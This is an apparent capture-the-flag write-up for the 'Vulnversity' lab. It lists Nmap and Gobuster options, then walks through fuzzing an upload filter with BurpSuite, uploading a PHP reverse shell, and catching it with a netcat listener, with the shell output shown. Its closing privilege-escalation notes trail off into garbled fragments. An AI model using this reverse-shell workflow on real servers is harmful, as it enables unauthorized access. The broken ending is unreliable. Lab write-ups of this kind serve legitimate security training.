# Vulnversity
## Reconnaissance

| Nmap Flag | Description
| --- | ---
| `-sV` | Attempt to determine version of running services.
| `-p <x>` or `-p-` | Port scan for port <x> or scan all ports.
| `-Pn` | Disable host discovery and scan for open ports.
| `-A` | Enable OS and version detection, executes in-built scripts for further examination.
| `-sC` | Scan with default Nmap scripts.
| `-v` | Verbose mode.
| `-sU` | UDP port scan.
| `-sS` | TCP SYN port scan.

## Locating Directories Using [Gobuster](https://github.com/OJ/gobuster)
* `Gobuster` is fast directory discovery tool.
* Brute forces URIs (directories and files), DNS subdomains, and virtual host names.
* Install Gobuster on Kali.
```
sudo apt-get install gobuster
```
* Requires wordlist to identify if public directory is available.
* Kali `/usr/share/wordlists` folder contains many wordlists.

| Gobuster Flag | Description
| --- | ---
| `dir` | Use directory/file bruteforcing.
| `-e` | Prints full URLs to the console.
| `-u` | Target URL.
| `-w` | Path to wordlist.
| `-U` and `-P` | Username and password for basic authentication.
| `-p <x>` | Proxy to use for requests.
| `-c <http cookies>` | Specify cookie for simulatin authentication.

## Compromise the Webserver
* Fuzz the upload form using BurpSuite to identify which extensions are not blocked.
### Use the Intruder to automate customised attacks.
#### 1. Make a wordlist of extensions.
```
printf "php\nphp3\nphp4\nphp5\nphtml" >  phpext.txt
```
#### 2. Intercept all browser traffic with BurpSuite.
* Upload file to `http://10.10.240.196:3333/internal/`.
#### 3. Send captured request to Intruder.
* "Sniper" attack type.
* "Payload Positions" > find the filename > prefix and suffix `ยง` to extension.
* "Payloads" > "Payload settings" > "Load" > phptext.txt.
#### 4. Start the attack.
* PHP reverse shell used as payload.
* Reverse shell is called on target, which forces a connection to listening attacker.
* [Download reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).
* Edit `php-reverse-shell.php`.
   * Change IP to attacking machine.
   * Rename file to `php-reverse-shell.phtml`.
```
mv php-reverse-shell.php php-reverse-shell.phtml
```
#### 5. Listen to incoming connections using netcat.
```
nc -lvnp 1234
```
#### 6. Upload shell to webserver.
#### 7. Execute payload.
   * Navigate to `http://10.10.240.196:3333/internal/uploads/php-reverse-shell.phtml`
#### 8. Connection established on Netcat session.
```
onnection from 10.10.240.196 33302 received!
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 10:00:44 up  1:34,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```
## Privilege Escalation
* Linux SUID (set owner userId upon execution) is file permission.
* Gives temporary permissions to user to run file with permission of file owner.
* `/usr/bin/passwd` binary file to change user password has SUID bit set.
  * User needs to be able to write to shadowers file but only root has access by default.
  * User account has root privileges to make the right changes.
```
421421421
rwxrwe
```
